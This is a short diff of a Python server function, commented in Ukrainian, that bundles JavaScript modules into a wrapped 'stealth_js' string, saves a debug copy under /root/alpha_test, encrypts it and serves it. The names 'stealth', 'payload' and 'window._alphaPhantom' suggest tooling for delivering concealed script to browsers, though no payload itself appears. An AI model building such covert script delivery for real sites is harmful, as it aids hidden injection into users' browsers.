@@ -234,11 +234,14 @@ if (!window._alphaPhantom) {
             else:
                 print(f"[УВАГА] Файл модуля не знайдено: {module}")
 
-        # 🛡️ БЕЗПЕЧНА ОБГОРТКА ТА ШИФРУВАННЯ (БЕЗ f-string!)
-        stealth_js = "(function() {\n" + raw_js + "\n})();"
-        with open("debug_payload.js", "w", encoding="utf-8") as debug_file:
-            debug_file.write(stealth_js)
-        encrypted_js = encrypt_payload(stealth_js, key)
+                # 🛡️ БЕЗПЕЧНА ОБГОРТКА ТА ШИФРУВАННЯ
+                stealth_js = "(function() {\n" + raw_js + "\n})();"
+
+                # ПРИМУСОВИЙ ЗАПИС У ТВОЮ ПАПКУ
+                with open("/root/alpha_test/debug_payload.js", "w", encoding="utf-8") as f:
+                    f.write(stealth_js)
+
+                encrypted_js = encrypt_payload(stealth_js, key)
 
         return Response(content=encrypted_js, media_type="text/plain")
 
